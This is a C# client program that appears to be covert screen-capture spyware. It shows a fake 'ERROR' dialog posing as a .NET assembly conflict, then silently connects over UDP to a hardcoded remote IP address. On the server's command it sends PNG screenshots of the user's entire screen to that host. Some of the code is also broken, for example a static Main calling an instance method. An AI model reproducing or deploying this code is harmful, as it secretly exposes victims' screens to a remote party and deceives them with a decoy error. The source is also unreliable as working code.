using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media.Imaging;
using System.Windows.Threading;
using Protocol;

namespace Client
{
    public class Main
    {
        private int fps = 30;
        private readonly UdpClient _server = new UdpClient("46.33.236.84", 57650);
        //private readonly UdpClient _server = new UdpClient("127.0.0.1", 57650);

        private IPEndPoint endPoint = null;
        
        public static void Main(string[] args)
        {
            MessageBox.Show(
                "There was a conflict between \"System.Runtime.CompilerServices.Unsafe, Version=4.0.4.1, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" and \"System.Runtime.CompilerServices.Unsafe, Version=4.0.6.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\".\r\n    \"System.Runtime.CompilerServices.Unsafe, Version = 4.0.4.1, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" was chosen because it was primary and \"System.Runtime.CompilerServices.Unsafe, Version=4.0.6.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" was not.\r\n    References which depend on \"System.Runtime.CompilerServices.Unsafe, Version = 4.0.4.1, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" [C:\\Users\\mkharitonov\\.nuget\\packages\\system.runtime.compilerservices.unsafe\\4.5.2\\ref\\netstandard2.0\\System.Runtime.CompilerServices.Unsafe.dll].",
                "ERROR", MessageBoxButton.OK, MessageBoxImage.Error);


            Receive();
        }

        public async void Receive()
        {
            await Task.Run(() =>
            {
                _server.Send(BitConverter.GetBytes((int)Commands.Connect), 4);

                while (true)
                {
                    Commands input = (Commands)BitConverter.ToInt32(_server.Receive(ref endPoint), 0);
                    switch (input)
                    {
                        case Commands.RequestScreen:
                            var image = ScreenShot();
                            SendScreen(image);
                            break;
                    }

                }
            });
        }

        public void SendScreen(byte[] source)
        {
            Transfer.SendUpdBig(_server, source);
        }

        public byte[] ScreenShot()
        {
            int screenWidth = (int)SystemParameters.VirtualScreenWidth;
            int screenHeight = (int)SystemParameters.VirtualScreenHeight;

            using (Bitmap bmp = new Bitmap(screenWidth, screenHeight, PixelFormat.Format32bppRgb))
            {
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                }
                return BitmapToByteArray(bmp);
            }

        }

        byte[] BitmapToByteArray(Bitmap bitmap)
        {
            using (MemoryStream memory = new MemoryStream())
            {
                bitmap.Save(memory, System.Drawing.Imaging.ImageFormat.Png);
                return memory.ToArray();
            }
        }

        public static BitmapImage BytesToImage(byte[] bytes)
        {
            using (var stream = new MemoryStream(bytes))
            {
                var bitmap = new BitmapImage();
                bitmap.BeginInit();
                bitmap.StreamSource = stream;
                bitmap.CacheOption = BitmapCacheOption.OnLoad;
                bitmap.EndInit();
                bitmap.Freeze();
                return bitmap;
            }
        }
    }
}
